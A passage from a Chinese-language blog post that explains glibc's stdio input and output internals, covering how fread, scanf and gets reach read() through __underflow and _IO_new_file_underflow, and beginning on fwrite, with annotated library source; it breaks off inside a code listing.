area的大小）</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212553.png" alt="image-20240302213145338" style="zoom:50%;" /><p>而后出来之后又调用<code>_IO_setb</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure><p>这个函数主要就是对<code>_IO_buf_base</code>和<code>_IO_buf_end</code>指针进行赋值。</p><p><strong><code>_IO_doallocbuf</code>函数主要是将resever area申请出来(大小为0x1000),并且对<code>_IO_buf_base</code>和<code>_IO_buf_end</code>指针进行赋值</strong>。</p><h3 id="从缓冲区拷贝数据部分"><a href="#从缓冲区拷贝数据部分" class="headerlink" title="从缓冲区拷贝数据部分"></a>从缓冲区拷贝数据部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;   <span class="comment">//输入缓冲区的数据</span></span><br><span class="line">     <span class="keyword">if</span> (want &lt;= have)       </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);      <span class="comment">//second：如果输入缓冲区有data，则拷贝输入缓冲区</span></span><br><span class="line">  fp-&gt;_IO_read_ptr += want;          </span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">     <span class="keyword">else</span>    </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);    <span class="comment">//先将能拷贝的拷贝到用户缓冲区</span></span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结合源码非常好理解</p><h3 id="缓冲区缺乏的处理部分"><a href="#缓冲区缺乏的处理部分" class="headerlink" title="缓冲区缺乏的处理部分"></a>缓冲区缺乏的处理部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Check for backup and repeat */</span>            <span class="comment">//third：如果输入缓冲区为0或不满足需求的处理</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))              <span class="comment">//_IO_IN_BACKUP 标志位用于指示文件流是否有一个输入缓冲区的备份</span></span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);   <span class="comment">//切换文件流的输入缓冲区为主要区域</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">     the user buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);       <span class="comment">//直接读取数据到用户缓冲区</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;            <span class="comment">//更新指针和临时数据</span></span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);      <span class="comment">//更新文件流指针</span></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先先是如果有缓冲区的备份，那么就会切换输入缓冲区为主要区域(这个不明白)，然后如果reserve area区域足够<code>(want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)))</code>且存在，则会调用<code>__underflow</code>，之后出来便是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(fp)-&gt;_IO_read_base = (fp-&gt;_IO_buf_base)</span><br><span class="line">(fp)-&gt;_IO_read_ptr = (fp-&gt;_IO_buf_base)</span><br><span class="line">(fp)-&gt;_IO_read_end = (fp-&gt;_IO_buf_base)</span><br><span class="line">(fp)-&gt;_IO_write_base = (fp)-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base</span><br><span class="line">(fp)-&gt;_IO_write_end = (fp-&gt;_IO_buf_base)</span><br></pre></td></tr></table></figure><p>疯狂赋值都赋值为<code>_IO_buf_base</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line"> count = want;</span><br><span class="line"> <span class="keyword">if</span> (fp-&gt;_IO_buf_base)          </span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">     <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;                 </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>接下来的这个是如果缓冲区足够大，大于等于128，就会进行对齐的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> count = _IO_SYSREAD (fp, s, count);       <span class="comment">//直接读取数据到用户缓冲区</span></span><br><span class="line"> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>之后便是直接调用_IO_SYSREAD直接读取数据到用户缓冲区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  s += count;            <span class="comment">//更新指针和临时数据</span></span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);      <span class="comment">//更新文件流指针</span></span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> n - want;</span><br></pre></td></tr></table></figure><p>搞完一切，就更新文件流的指针，之后直接return就结束了</p><h3 id="underflow"><a href="#underflow" class="headerlink" title="__underflow"></a>__underflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line"><span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure><p>这里面首先是大量的check，之后return了一个<code>_IO_UNDERFLOW</code>函数，这个是main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><p>首先也先是大量的检查，然后都赋值为<code>_IO_buf_base</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">  = fp-&gt;_IO_buf_base;</span><br></pre></td></tr></table></figure><p>之后再次调用_IO_SYSREAD函数来将数据读到输入缓冲区，之后再一些check就return了</p><h3 id="IO-SYSREAD"><a href="#IO-SYSREAD" class="headerlink" title="_IO_SYSREAD"></a>_IO_SYSREAD</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_file_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">  ? __read_nocancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">  : __read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_read)</span><br></pre></td></tr></table></figure><p>一个非常底层的操作，就不过多赘述了，能大致了解功能应该就差不多？</p><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">_IO_new_file_underflow at fileops.c</span><br><span class="line">__GI__IO_default_uflow at genops.c</span><br><span class="line">_IO_vfscanf_internal at vfscanf.c</span><br><span class="line">__isoc99_scanf at  at isoc99_scanf.c</span><br></pre></td></tr></table></figure><p>栈回溯</p><p>可以看到scanf最终是<strong>调用stdin的vtable中的<code>_IO_new_file_underflow</code>去调用read</strong>的。</p><p>不过它并不是由<code>_IO_file_xsgetn</code>调用的，而是使用vtable中的<code>__uflow</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_uflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_uflow)</span><br></pre></td></tr></table></figure><p><code>__uflow</code>函数首先直接调用<code>_IO_new_file_underflow</code>,因此最终也是<code>_IO_new_file_underflow</code>实现的输入。之后其只返回<code>_IO_read_ptr</code>处的一个字符</p><h3 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">__GI__IO_file_underflow</span><br><span class="line">__GI__IO_default_uflow</span><br><span class="line">gets</span><br></pre></td></tr></table></figure><p>函数调用栈与scanf基本一致：</p><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><h3 id="IO-fwrite"><a href="#IO-fwrite" class="headerlink" title="_IO_fwrite"></a>_IO_fwrite</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)<span class="comment">//buf：要写入的数据的地址，fp：要写入的文件流指针</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fwrite)</span><br></pre></td></tr></table></figure><p>主要是调用<code>_IO_sputn</code></p><h3 id="IO-new-file-xsputn"><a href="#IO-new-file-xsputn" class="headerlink" title="_IO_new_file_xsputn"></a>_IO_new_file_xsputn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 